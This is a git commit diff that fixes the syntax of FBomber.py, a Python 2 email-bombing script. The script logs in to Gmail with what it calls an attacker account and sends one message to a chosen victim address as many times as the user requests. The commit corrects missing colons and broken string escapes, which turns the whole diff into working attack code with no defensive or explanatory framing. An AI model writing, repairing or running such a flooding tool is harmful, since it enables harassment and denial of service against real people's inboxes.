f5d0507e91c2bd7dd37af3383be2b86f3e3b2b04
FakoYT <64706907+FakoYT@users.noreply.github.com>
2020-11-16 13:07:03 +0100

    Update FBomber.py

--- FBomber.py
+++ FBomber.py
@@ -27,19 +27,18 @@ user = raw_input('Name:  ')
 print '       '
 passwd = getpass.getpass('Your Attacker Gmail Password:  ')
 
-print '       '
-print '       '
+print '   '
 
-to = raw_input('nTo ')
+to = raw_input('\nTo: ')
 
-
-print '    '
-
-body = raw_input('Message ')
 
 print '    '
 
-total = input('Number of send ')
+body = raw_input('Message: ')
+
+print '    '
+
+total = input('Number of send: ')
 
 smtp_server = 'smtp.gmail.com'
 port = 587
@@ -47,23 +46,23 @@ port = 587
 
 print ''
 
-try
+try:
     server = smtplib.SMTP(smtp_server,port) 
     server.ehlo()
     server.starttls()
     server.login(email,passwd)
-    for i in range(1, total+1)
+    for i in range(1, total+1):
         subject = os.urandom(9)
-        msg = 'From ' + user + 'nSubject ' + 'n' + body
+        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
         server.sendmail(email,to,msg)
-        print rE-mails sent %i % i
+        print "\rE-mails sent: %i" % i
         time.sleep(1)
         sys.stdout.flush()
     server.quit()
-    print 'n Done !!!'
-except KeyboardInterrupt
+    print '\n Done !!!'
+except KeyboardInterrupt:
     print '[-] Canceled'
     sys.exit()
-except smtplib.SMTPAuthenticationError
-    print 'n[!] The username or password you entered is incorrect.'
+except smtplib.SMTPAuthenticationError:
+    print '\n[!] The username or password you entered is incorrect.'
     sys.exit()
